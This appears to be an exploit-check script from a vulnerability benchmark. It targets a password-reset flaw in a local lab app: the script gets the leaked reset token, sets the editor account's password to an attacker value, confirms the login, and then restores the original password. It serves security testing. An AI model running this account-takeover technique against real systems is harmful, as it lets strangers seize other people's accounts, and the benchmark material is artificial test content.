#!/usr/bin/env bash
# RESET-001 (CWE-640/CWE-330): the password-reset token is a deterministic hash
# and is handed back to the caller, so anyone can reset another account.
# Self-restoring (resets editor back to the seed password).
set -eu
. "$(dirname "$0")/_lib.sh"
TOKEN="$(csrf_from /login)"
RT=$(curl -s -c "$JAR" -b "$JAR" -X POST "$TARGET/password/email" \
      -d "_token=$TOKEN" --data-urlencode "email=editor@bench.local" | jget token)
[ -n "$RT" ] || exit 1
curl -s -c "$JAR" -b "$JAR" -X POST "$TARGET/password/reset" -d "_token=$TOKEN" \
  --data-urlencode "email=editor@bench.local" --data-urlencode "token=$RT" \
  --data-urlencode "password=Pwned123!" >/dev/null
login editor@bench.local "Pwned123!"
OK=$(curl -s -b "$JAR" "$TARGET/dashboard" | grep -c 'Signed in as editor@bench.local' || true)
# restore the seed password
TOKEN="$(csrf_from /login)"
R2=$(curl -s -c "$JAR" -b "$JAR" -X POST "$TARGET/password/email" \
      -d "_token=$TOKEN" --data-urlencode "email=editor@bench.local" | jget token)
if [ -n "$R2" ]; then
  curl -s -c "$JAR" -b "$JAR" -X POST "$TARGET/password/reset" -d "_token=$TOKEN" \
    --data-urlencode "email=editor@bench.local" --data-urlencode "token=$R2" \
    --data-urlencode "password=Editor123!" >/dev/null
fi
[ "$OK" -ge 1 ]
